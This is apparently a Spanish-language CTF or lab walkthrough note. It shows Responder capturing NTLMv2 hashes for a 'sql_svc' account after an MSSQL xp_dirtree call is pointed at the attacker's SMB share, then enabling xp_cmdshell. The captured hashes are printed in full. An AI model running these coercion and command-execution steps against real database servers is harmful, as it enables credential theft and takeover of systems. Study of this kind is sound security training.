Se puede realizar validacion prendiendo responder para verificar que hashes nos llegan si hacemos una petición

En la maquina atacante prendemos responder 

```shell
─$ sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.244]
    Responder IPv6             [dead:beef:2::10f2]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-KAFENC348Y3]
    Responder Domain Name      [IBIR.LOCAL]
    Responder DCE-RPC Port     [49020]

[+] Listening for events...                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:61bb4282fc5758b8:96C8EDE6DF91FABDAB9CEB3FC3F8E336:01010000000000000019AA5D956BDC016EF670E9D63F8F970000000002000800490042004900520001001E00570049004E002D004B004100460045004E0043003300340038005900330004003400570049004E002D004B004100460045004E004300330034003800590033002E0049004200490052002E004C004F00430041004C000300140049004200490052002E004C004F00430041004C000500140049004200490052002E004C004F00430041004C00070008000019AA5D956BDC0106000400020000000800300030000000000000000000000000300000A09945515E6B898ABFCCD38EA6F11EA7A6BE29DEA8ACFCA135FAD76DDB2763C70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200340034000000000000000000                                          
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:28e34a52387700db:E5CE8D160CA66ACB7F04C0CF06667DD2:01010000000000000019AA5D956BDC0165FCC5AF16C4E1150000000002000800490042004900520001001E00570049004E002D004B004100460045004E0043003300340038005900330004003400570049004E002D004B004100460045004E004300330034003800590033002E0049004200490052002E004C004F00430041004C000300140049004200490052002E004C004F00430041004C000500140049004200490052002E004C004F00430041004C00070008000019AA5D956BDC0106000400020000000800300030000000000000000000000000300000A09945515E6B898ABFCCD38EA6F11EA7A6BE29DEA8ACFCA135FAD76DDB2763C70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200340034000000000000000000                                                                                                                        
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:0d7bf0aef6ebd3dc:7D7B470DCAA3E6417FB40E2BD334D311:01010000000000000019AA5D956BDC017BF093ABE8731E050000000002000800490042004900520001001E00570049004E002D004B004100460045004E0043003300340038005900330004003400570049004E002D004B004100460045004E004300330034003800590033002E0049004200490052002E004C004F00430041004C000300140049004200490052002E004C004F00430041004C000500140049004200490052002E004C004F00430041004C00070008000019AA5D956BDC0106000400020000000800300030000000000000000000000000300000A09945515E6B898ABFCCD38EA6F11EA7A6BE29DEA8ACFCA135FAD76DDB2763C70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200340034000000000000000000                                                                                                                        
[+] Exiting...
```

se envía una petición a la maquina atacante por smb y se reciben los hashes


```shell
SQL (PublicUser  guest@master)> EXEC MASTER.sys.xp_dirtree '\\10.10.14.244\test', 1, 1
subdirectory   depth   file   
------------   -----   ----   
SQL (PublicUser  guest@master)> EXEC MASTER.sys.xp_dirtree '\\10.10.14.244\test', 1, 1
subdirectory   depth   file   
------------   -----   ----   
```

```shell
xp_cmdshell 'whoami';
SP_CONFIGURE 'show advanced options', 1;
RECONFIGURE;
SP_CONFIGURE 'xp_cmdshell', 1;
RECONFIGURE;
```

